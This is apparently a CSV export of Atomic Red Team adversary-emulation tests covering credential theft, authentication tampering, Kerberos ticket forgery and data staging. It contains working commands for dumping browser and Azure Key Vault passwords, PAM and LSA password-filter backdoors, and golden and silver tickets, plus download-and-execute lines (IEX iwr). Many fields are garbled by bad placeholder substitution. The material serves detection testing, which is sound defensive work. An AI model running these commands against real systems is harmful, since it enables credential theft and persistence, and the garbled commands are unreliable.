"MITRE_ID","File","AtomicTest","ExecutorName","Command","Cleanup","Dependencies"
"T1555.003","C:\AtomicRedTeam\atomics\T1555.003\T1555.003.yaml","Search macOS Safari Cookies","sh","cd ~/Library/Cookies
grep -q ""coinbase"" ""Cookies.binarycookies""
",,""
"T1555.003","C:\AtomicRedTeam\atomics\T1555.003\T1555.003.yaml","LaZagne - Credentials from Browser","command_prompt","""#{lazagne_path}"" browsers
",,"New-Item -Type Directory (split-path ""#{lazagne_path}"") -ErrorAction ignore | Out-Null Invoke-WebRequest ""https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe"" -OutFile ""#{lazagne_path}"" "
"T1555.003","C:\AtomicRedTeam\atomics\T1555.003\T1555.003.yaml","Decrypt Mozilla Passwords with Firepwd.py","powershell","$PasswordDBLocation = get-childitem -path ""$env:appdata\Mozilla\Firefox\Profiles\*.default-release\""
cmd /c #{VS_CMD_Path}\Scripts\python.exe #{VS_CMD_Path} -d $PasswordDBLocation > #{VS_CMD_Path}
cat #{VS_CMD_Path}
","Remove-Item -Path ""#{VS_CMD_Path}"" -erroraction silentlycontinue   
","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null Invoke-WebRequest ""https://ftp.mozilla.org/pub/firefox/releases/98.0/win64/en-US/Firefox%20Setup%2098.0.msi"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\firefox.msi"" msiexec.exe /i ""PathToAtomicsFolder\..\ExternalPayloads\firefox.msi"" /quiet sleep -s 30 start-process ""$env:programfiles\Mozilla Firefox\firefox.exe"". sleep -s 5 stop-process -name ""firefox"" ; New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null invoke-webrequest ""https://aka.ms/vs/17/release/vs_BuildTools.exe"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\VS_BuildTools.exe"" write-host ""Visual Studio Build Tools (Desktop Development with C++) must be installed manually. Please run the installer from PathToAtomicsFolder\..\ExternalPayloads\VS_BuildTools.exe."" ; New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null invoke-webrequest ""https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe"" Start-Process -FilePath ""PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe"" -ArgumentList ""/quiet InstallAllUsers=1 PrependPath=1 Include_test=0"" -Wait ; py -m venv ""#{venv_path}"" ; New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null Invoke-WebRequest ""https://raw.githubusercontent.com/lclevy/firepwd/167eabf3b88d5a7ba8b8bc427283f827b6885982/firepwd.py"" -outfile ""#{Firepwd_Path}"" ; if (test-path ""#{VS_CMD_Path}""){#{venv_path}\Scripts\pip.exe install pycryptodome | out-null | cmd /c %comspec% /k ""#{VS_CMD_Path}"" | out-null} else {write-host ""Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq""} ; if (test-path ""#{VS_CMD_Path}"") & {#{venv_path}\Scripts\pip.exe install pyasn1 | out-null | cmd /c %comspec% /k ""#{VS_CMD_Path}"" | out-null} else {write-host ""Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq.""} "
"T1555.003","C:\AtomicRedTeam\atomics\T1555.003\T1555.003.yaml","LaZagne.py - Dump Credentials from Firefox Browser","sh","python3 /tmp/LaZagne/Linux/laZagne.py browsers -firefox >> /tmp/firefox_password.txt","rm -R /tmp/LaZagne; rm -f /tmp/firefox_password.txt","cd /tmp; git clone https://github.com/AlessandroZ/LaZagne; cd /tmp/LaZagne/; pip install -r requirements.txt; apt install git; apt install python3-pip -y; pip install pyasn1 psutil Crypto"
"T1555.003","C:\AtomicRedTeam\atomics\T1555.003\T1555.003.yaml","WebBrowserPassView - Credentials from Browser","powershell","Start-Process ""PathToAtomicsFolder\T1555.003\bin\""
Start-Sleep -Second 4
Stop-Process -Name ""WebBrowserPassView""
",,"New-Item -Type Directory ""PathToAtomicsFolder\T1555.003\bin\"" -ErrorAction ignore -Force | Out-Null Invoke-WebRequest https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1555.003/bin/WebBrowserPassView.exe -OutFile ""#{webbrowserpassview_path}"" "
"T1555.003","C:\AtomicRedTeam\atomics\T1555.003\T1555.003.yaml","Dump Chrome Login Data with esentutl","command_prompt","esentutl.exe /y ""%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"" /d ""PathToAtomicsFolder\..\ExternalPayloads\""
","del /f /q PathToAtomicsFolder\..\ExternalPayloads\ > nul 2>&1
","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null $installer = ""PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi"" Invoke-WebRequest -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi"" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi msiexec /i $installer /qn Start-Process -FilePath ""chrome.exe"" Stop-Process -Name ""chrome"" "
"T1555.006","C:\AtomicRedTeam\atomics\T1555.006\T1555.006.yaml","Azure - Dump All Azure Key Vaults with Microburst","powershell","import-module ""PathToAtomicsFolder\..\ExternalPayloads\Get-AzurePasswords.ps1""
$Password = ConvertTo-SecureString -String ""PathToAtomicsFolder\..\ExternalPayloads\"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""PathToAtomicsFolder\..\ExternalPayloads\"", $Password
Connect-AzureRmAccount -Credential $Credential
Get-AzurePasswords -subscription 'PathToAtomicsFolder\..\ExternalPayloads\' > PathToAtomicsFolder\..\ExternalPayloads\
cat PathToAtomicsFolder\..\ExternalPayloads\
","remove-item PathToAtomicsFolder\..\ExternalPayloads\ -force -erroraction silentlycontinue
","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null invoke-webrequest ""https://raw.githubusercontent.com/NetSPI/MicroBurst/c771c665a2c71f9c5ba474869cd1c211ebee68fd/AzureRM/Get-AzurePasswords.ps1"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\Get-AzurePasswords.ps1"" ; Install-Module -Name AzureRM -Force -allowclobber ; Install-Module -Name Azure -Force -allowclobber "
"T1556.002","C:\AtomicRedTeam\atomics\T1556.002\T1556.002.yaml","Install and Register Password Filter DLL","powershell","reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ ""PathToAtomicsFolder\T1556.002\lsa_backup.reg""
$passwordFilterName = (Copy-Item ""https://github.com/redcanaryco/atomicredteam/atomics/T1556.002/bin/AtomicRedTeamPWFilter.dll\https://github.com/redcanaryco/atomicredteam/atomics/T1556.002/bin/AtomicRedTeamPWFilter.dll"" -Destination ""C:\Windows\System32"" -PassThru).basename
$lsaKey = Get-Item ""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\""
$notificationPackagesValues = $lsaKey.GetValue(""Notification Packages"")
$notificationPackagesValues += $passwordFilterName
Set-ItemProperty ""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"" ""Notification Packages"" $notificationPackagesValues
","reg.exe import ""PathToAtomicsFolder\T1556.002\lsa_backup.reg""
remove-item C:\Windows\System32\https://github.com/redcanaryco/atomicredteam/atomics/T1556.002/bin/AtomicRedTeamPWFilter.dll
","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 Invoke-WebRequest ""https://github.com/redcanaryco/atomicredteam/atomics/T1556.002/bin/AtomicRedTeamPWFilter.dll"" -OutFile ""#{dll_path}\#{dll_name}"" "
"T1556.002","C:\AtomicRedTeam\atomics\T1556.002\T1556.002.yaml","Install Additional Authentication Packages","powershell","reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ ""PathToAtomicsFolder\T1556.002\lsa_backup.reg""
$passwordFilterName = (Copy-Item ""https://github.com/redcanaryco/atomicredteam/atomics/T1556.002/bin/AtomicRedTeamPWFilter.dll\https://github.com/redcanaryco/atomicredteam/atomics/T1556.002/bin/AtomicRedTeamPWFilter.dll"" -Destination ""C:\Windows\System32"" -PassThru).basename
$lsaKey = Get-Item ""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\""
$AuthenticationPackagesValues = $lsaKey.GetValue(""Authentication Packages"")
$AuthenticationPackagesValues += $passwordFilterName
Set-ItemProperty ""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"" ""Authentication Packages"" $AuthenticationPackagesValues
","reg.exe import ""PathToAtomicsFolder\T1556.002\lsa_backup.reg""
remove-item C:\Windows\System32\https://github.com/redcanaryco/atomicredteam/atomics/T1556.002/bin/AtomicRedTeamPWFilter.dll
","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 Invoke-WebRequest ""https://github.com/redcanaryco/atomicredteam/atomics/T1556.002/bin/AtomicRedTeamPWFilter.dll"" -OutFile ""#{dll_path}\#{dll_name}"" "
"T1556.003","C:\AtomicRedTeam\atomics\T1556.003\T1556.003.yaml","Malicious PAM rule","sh","sudo sed -i ""1s,^,auth sufficient pam_succeed_if.so uid >= 0\n,g"" /etc/pam.d/su-l
","sudo sed -i ""\,auth sufficient pam_succeed_if.so uid >= 0,d"" /etc/pam.d/su-l
",""
"T1556.003","C:\AtomicRedTeam\atomics\T1556.003\T1556.003.yaml","Malicious PAM rule (freebsd)","sh","sudo sed -i """" ""8s,^,auth sufficient pam_succeed_if.so uid >= 0\n,g"" /etc/pam.d/su
","sudo sed -i """" ""/auth sufficient pam_succeed_if.so uid >= 0/d"" /etc/pam.d/su
",""
"T1556.003","C:\AtomicRedTeam\atomics\T1556.003\T1556.003.yaml","Malicious PAM module","sh","sudo sed -i ""`which apt-get`s,^,`which apt-get`\n,g"" `which apt-get`
","sudo sed -i ""\,`which apt-get`,d"" `which apt-get`
","if [ -n ""`which apt-get`"" ]; then sudo apt-get -y install libpam0g-dev; elif [ -n ""`which yum`"" ]; then sudo yum -y install pam-devel; fi ; sudo gcc -shared -fPIC -o #{path_to_pam_module} #{path_to_pam_module_source} "
"T1558.001","C:\AtomicRedTeam\atomics\T1558.001\T1558.001.yaml","Crafting Active Directory golden tickets with mimikatz","powershell","Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore

# get current domain SID if default was used
$domain_sid = ""PathToAtomicsFolder\..\ExternalPayloads\""
If ($domain_sid -Match ""DEFAULT"") {
  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60
  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain
  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value
  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))
}

# create batch file with commands to run in a separate ""runas /netonly"" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to golden.txt temp file, because we cannot capture ""runas /netonly"" output otherwise
@""
>%TEMP%\golden.txt 2>&1 (
  echo Purge existing tickets and create golden ticket:
  klist purge
  PathToAtomicsFolder\..\ExternalPayloads\ ""kerberos::golden /domain:PathToAtomicsFolder\..\ExternalPayloads\ /sid:DOMAIN_SID /aes256:PathToAtomicsFolder\..\ExternalPayloads\ /user:PathToAtomicsFolder\..\ExternalPayloads\ /ptt"" ""exit""

  echo.
  echo Requesting SYSVOL:
  dir \\PathToAtomicsFolder\..\ExternalPayloads\\SYSVOL
  
  echo.
  echo Tickets after requesting SYSVOL:
  klist

  echo.
  echo End of Golden Ticket attack
)
""@ -Replace ""DOMAIN_SID"", $domain_sid | Out-File -Encoding OEM $env:TEMP\golden.bat

# run batch file in a new empty session (password and username do not matter)
echo ""foo"" | runas /netonly /user:fake ""$env:TEMP\golden.bat"" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path ""$env:TEMP\golden.txt"" -Wait | ForEach-Object {
    if ($_ -match 'End of Golden Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\golden.txt

# cleanup temp files
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore
",,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1"" -UseBasicParsing)  $releases = ""https://api.github.com/repos/gentilkiwi/mimikatz/releases"" $zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith("".zip"") } $mimikatz_exe = cmd /c echo #{mimikatz_path} $basePath = Split-Path $mimikatz_exe | Split-Path Invoke-FetchFromZip $zipUrl ""x64/mimikatz.exe"" $basePath "
"T1558.001","C:\AtomicRedTeam\atomics\T1558.001\T1558.001.yaml","Crafting Active Directory golden tickets with Rubeus","powershell","Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore

cmd.exe /c ""$Env:temp\rubeus.exe"" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\') + ""."" + ""$ENV:userdnsdomain"") /printcmd /outfile:golden
$filename = (Get-ChildItem | ? {$_.Name.startswith(""golden_"")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name

# create batch file with commands to run in a separate ""runas /netonly"" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to golden.txt temp file, because we cannot capture ""runas /netonly"" output otherwise
@""
>%TEMP%\golden.txt 2>&1 (
  echo Purge existing tickets and create golden ticket:
  klist purge
  cd %temp%
  ""$Env:temp\rubeus.exe"" ptt /ticket:kirbifile

  echo.
  echo Requesting SYSVOL:
  dir \\$($ENV:logonserver.TrimStart('\') + ""."" + ""$ENV:userdnsdomain"")\SYSVOL
  
  echo.
  echo Tickets after requesting SYSVOL:
  klist

  echo.
  echo End of Golden Ticket attack
)
""@ -Replace ""kirbifile"", $filename | Out-File -Encoding OEM $env:TEMP\golden.bat

# run batch file in a new empty session (password and username do not matter)
echo ""foo"" | runas /netonly /user:fake ""$env:TEMP\golden.bat"" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path ""$env:TEMP\golden.txt"" -Wait | ForEach-Object {
    if ($_ -match 'End of Golden Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\golden.txt

# cleanup temp files
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore
",,"Write-Host Joining this computer to a domain must be done manually ; Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{local_folder}\#{local_executable} "
"T1558.002","C:\AtomicRedTeam\atomics\T1558.002\T1558.002.yaml","Crafting Active Directory silver tickets with mimikatz","powershell","Remove-Item $env:TEMP\silver.bat -ErrorAction Ignore
Remove-Item $env:TEMP\silver.txt -ErrorAction Ignore

# get current domain SID if default was used
$domain_sid = ""PathToAtomicsFolder\..\ExternalPayloads\""
If ($domain_sid -Match ""DEFAULT"") {
  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60
  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain
  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value
  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))
}

# create batch file with commands to run in a separate ""runas /netonly"" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to silver.txt temp file, because we cannot capture ""runas /netonly"" output otherwise
@""
>%TEMP%\silver.txt 2>&1 (
  echo Purge existing tickets and create silver ticket:
  klist purge
  PathToAtomicsFolder\..\ExternalPayloads\ ""kerberos::golden /domain:PathToAtomicsFolder\..\ExternalPayloads\ /sid:DOMAIN_SID /aes256:PathToAtomicsFolder\..\ExternalPayloads\ /user:PathToAtomicsFolder\..\ExternalPayloads\ /service:HOST /target:PathToAtomicsFolder\..\ExternalPayloads\.PathToAtomicsFolder\..\ExternalPayloads\ /ptt"" ""exit""

  echo.
  echo executing:schtasks /query /S PathToAtomicsFolder\..\ExternalPayloads\.PathToAtomicsFolder\..\ExternalPayloads\
  schtasks /query /S PathToAtomicsFolder\..\ExternalPayloads\.PathToAtomicsFolder\..\ExternalPayloads\
  
  echo.
  echo Tickets after requesting schtasks:
  klist

  echo.
  echo End of Silver Ticket attack
)
""@ -Replace ""DOMAIN_SID"", $domain_sid | Out-File -Encoding OEM $env:TEMP\silver.bat

# run batch file in a new empty session (password and username do not matter)
echo ""foo"" | runas /netonly /user:fake ""$env:TEMP\silver.bat"" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path ""$env:TEMP\silver.txt"" -Wait | ForEach-Object {
    if ($_ -match 'End of Silver Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\silver.txt

# cleanup temp files
Remove-Item $env:TEMP\silver.bat -ErrorAction Ignore
Remove-Item $env:TEMP\silver.txt -ErrorAction Ignore
",,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1"" -UseBasicParsing)  $releases = ""https://api.github.com/repos/gentilkiwi/mimikatz/releases"" $zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith("".zip"") } $mimikatz_exe = cmd /c echo #{mimikatz_path} $basePath = Split-Path $mimikatz_exe | Split-Path Invoke-FetchFromZip $zipUrl ""x64/mimikatz.exe"" $basePath "
"T1558.003","C:\AtomicRedTeam\atomics\T1558.003\T1558.003.yaml","Rubeus kerberoast","powershell","klist purge
cmd.exe /c ""PathToAtomicsFolder\..\ExternalPayloads\\PathToAtomicsFolder\..\ExternalPayloads\"" kerberoast PathToAtomicsFolder\..\ExternalPayloads\ /outfile:""PathToAtomicsFolder\..\ExternalPayloads\\PathToAtomicsFolder\..\ExternalPayloads\""
","Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\\PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore
","Write-Host Joining this computer to a domain must be done manually ; New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null Invoke-Webrequest -Uri #{rubeus_url} -OutFile ""#{local_folder}\#{local_executable}"" "
"T1558.003","C:\AtomicRedTeam\atomics\T1558.003\T1558.003.yaml","Extract all accounts in use as SPN using setspn","command_prompt","setspn -T %USERDNSDOMAIN% -Q */*
",,"Write-Host Joining this computer to a domain must be done manually "
"T1558.003","C:\AtomicRedTeam\atomics\T1558.003\T1558.003.yaml","Request All Tickets via PowerShell","powershell","Add-Type -AssemblyName System.IdentityModel  
setspn.exe -T %USERDNSDOMAIN% -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  
",,"Write-Host Joining this computer to a domain must be done manually "
"T1558.004","C:\AtomicRedTeam\atomics\T1558.004\T1558.004.yaml","Rubeus asreproast","powershell","cmd.exe /c ""PathToAtomicsFolder\..\ExternalPayloads\\PathToAtomicsFolder\..\ExternalPayloads\"" asreproast /outfile:""PathToAtomicsFolder\..\ExternalPayloads\\PathToAtomicsFolder\..\ExternalPayloads\""
","Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\\PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore
","Write-Host Joining this computer to a domain must be done manually ; New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{local_folder}\#{local_executable} "
"T1560","C:\AtomicRedTeam\atomics\T1560\T1560.yaml","Compress Data for Exfiltration With PowerShell","powershell","dir $env:USERPROFILE -Recurse | Compress-Archive -DestinationPath $env:USERPROFILE\T1560-data-ps.zip
","Remove-Item -path $env:USERPROFILE\T1560-data-ps.zip -ErrorAction Ignore",""
"T1560.001","C:\AtomicRedTeam\atomics\T1560.001\T1560.001.yaml","Compress Data for Exfiltration With Rar","command_prompt","""https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe"" a -r https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe\*https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe
","del /f /q /s https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe >nul 2>&1
","echo Downloading Winrar installer bitsadmin /transfer myDownloadJob /download /priority normal ""https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe"" #{rar_installer} #{rar_installer} /S "
"T1560.001","C:\AtomicRedTeam\atomics\T1560.001\T1560.001.yaml","Compress Data and lock with password for Exfiltration with winrar","command_prompt","mkdir .\tmp\victim-files
cd .\tmp\victim-files
echo ""This file will be encrypted"" > .\encrypted_file.txt
""https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe"" a -hp""blue"" hello.rar
dir
",,"echo Downloading Winrar installer bitsadmin /transfer myDownloadJob /download /priority normal ""https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe"" #{rar_installer} #{rar_installer} /S "
"T1560.001","C:\AtomicRedTeam\atomics\T1560.001\T1560.001.yaml","Compress Data and lock with password for Exfiltration with winzip","command_prompt","path=%path%;""C:\Program Files (x86)\winzip""
mkdir .\tmp\victim-files
cd .\tmp\victim-files
echo ""This file will be encrypted"" > .\encrypted_file.txt
""https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1"" -min -a -s""hello"" archive.zip *
dir
",,"IEX(IWR ""https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1"" -UseBasicParsing) New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null if(Invoke-WebRequestVerifyHash ""#{winzip_url}"" ""PathToAtomicsFolder\..\ExternalPayloads\winzip.exe"" #{winzip_hash}){   Write-Host Follow the installation prompts to continue   cmd /c ""PathToAtomicsFolder\..\ExternalPayloads\winzip.exe"" } "
"T1560.001","C:\AtomicRedTeam\atomics\T1560.001\T1560.001.yaml","Compress Data and lock with password for Exfiltration with 7zip","command_prompt","mkdir $PathToAtomicsFolder\T1560.001\victim-files
cd $PathToAtomicsFolder\T1560.001\victim-files
echo ""This file will be encrypted"" > .\encrypted_file.txt
""https://www.7-zip.org/a/7z2301-x64.exe"" u archive.7z *txt -pblue
dir
","rmdir /s /Q $PathToAtomicsFolder\T1560.001\victim-files >nul 2>&1
","echo Downloading 7-zip installer bitsadmin /transfer myDownloadJob /download /priority normal ""https://www.7-zip.org/a/7z2301-x64.exe"" #{7zip_installer} #{7zip_installer} /S "
"T1560.001","C:\AtomicRedTeam\atomics\T1560.001\T1560.001.yaml","Data Compressed - nix - zip","bash","zip $HOME/data.zip /var/log/{w,b}tmp
","rm -f $HOME/data.zip
","(which yum && yum -y install epel-release zip)||(which apt-get && apt-get install -y zip) echo Please set input_files argument to include files that exist "
"T1560.001","C:\AtomicRedTeam\atomics\T1560.001\T1560.001.yaml","Data Compressed - nix - gzip Single File","sh","test -e $HOME/victim-gzip.txt && gzip -k $HOME/victim-gzip.txt || (echo 'confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101' >> $HOME/victim-gzip.txt; gzip -k $HOME/victim-gzip.txt)
","rm -f $HOME/victim-gzip.txt.gz
",""
"T1560.001","C:\AtomicRedTeam\atomics\T1560.001\T1560.001.yaml","Data Compressed - nix - tar Folder or File","sh","tar -cvzf $HOME/data.tar.gz $HOME/$USERNAME
","rm -f $HOME/data.tar.gz
","mkdir -p #{input_file_folder} && touch #{input_file_folder}/file1 "
"T1560.001","C:\AtomicRedTeam\atomics\T1560.001\T1560.001.yaml","Data Encrypted with zip and gpg symmetric","sh","mkdir -p /tmp/T1560
cd /tmp/T1560; touch a b c d e f g
zip --password ""InsertPasswordHere"" /tmp/T1560/T1560 ./*
echo ""InsertPasswordHere"" | gpg --batch --yes --passphrase-fd 0 --output /tmp/T1560/T1560.zip.gpg -c /tmp/T1560/T1560.zip
ls -l /tmp/T1560
","rm -Rf /tmp/T1560
","(which pkg && pkg install -y gnupg zip)||(which yum && yum -y install epel-release zip gpg)||(which apt-get && apt-get install -y zip gpg) "
"T1560.001","C:\AtomicRedTeam\atomics\T1560.001\T1560.001.yaml","Encrypts collected data with AES-256 and Base64","bash","zip -r  /tmp/t1560/t1560_data.zip /tmp/t1560
openssl enc -aes-256-cbc -pass pass:atomic_enc_pass -p -in /tmp/t1560/t1560_data.zip -out /tmp/t1560/t1560_data.enc 
cat /tmp/t1560/t1560_data.enc | base64","rm -rf /tmp/t1560","if [ ! -d #{input_folder} ]; then mkdir -p #{input_folder}; cd #{input_folder}; touch {a..z}.data; fi;"
